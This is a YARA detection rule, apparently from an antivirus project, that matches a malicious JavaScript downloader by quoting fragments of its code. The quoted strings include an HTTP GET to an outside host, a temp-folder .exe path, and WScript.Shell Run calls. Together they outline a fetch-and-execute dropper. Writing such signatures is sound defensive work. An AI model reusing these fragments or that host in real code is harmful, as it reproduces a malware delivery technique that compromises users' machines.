rule sig_20160329_48468a3ac55f13f190eed9cfafb41b85 {
  meta:
    description = "datamaliciousorder - file 20160329_48468a3ac55f13f190eed9cfafb41b85.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "337b3d4c2629722bc3a2a6438597acdaf14157d8b4d77349da96ec9ae4a47ef9"

  strings:
    $s1  = "OU[Dv](\"GET\", \"http://www.the2ndedit.com/j1oisa\", false);" fullword ascii
    $s2  = "function pJ() {return J[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"WY5rBg9AgDXyQe.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[z0](l() * 11); if (OU[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function P(p, af){v = v * 1; return p - af;};" fullword ascii
    $s5  = "var J = function dR() {return WScript[np](\"WScript.Shell\");}(), ZV = 11;" fullword ascii
    $s6  = "function i(){return \"\" + t;};" fullword ascii
    $s7  = "function eS(pI){J[\"Run\"](pI, v, v);};" fullword ascii
    $s8  = "function hq() {return ((U == true) && (U == f)) ? 1 : v;};" fullword ascii
    $s9  = " while (V){" fullword ascii
    $s10 = "function g(Cn) {var z = (1, 2, 3, 4, 5, Cn); return z;};" fullword ascii
    $s11 = "function kb()" fullword ascii
    $s12 = "function l(){return 22;};" fullword ascii
    $s13 = "var l0 = new this[\"Date\"]();" fullword ascii
    $s14 = "function td(){return np;};" fullword ascii
    $s15 = "return P(bs, hT);" fullword ascii
    $s16 = "var f = false;" fullword ascii
    $s17 = "f = true; " fullword ascii
    $s18 = "U = true; " fullword ascii
    $s19 = "var U = false;" fullword ascii
    $s20 = "var pH = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}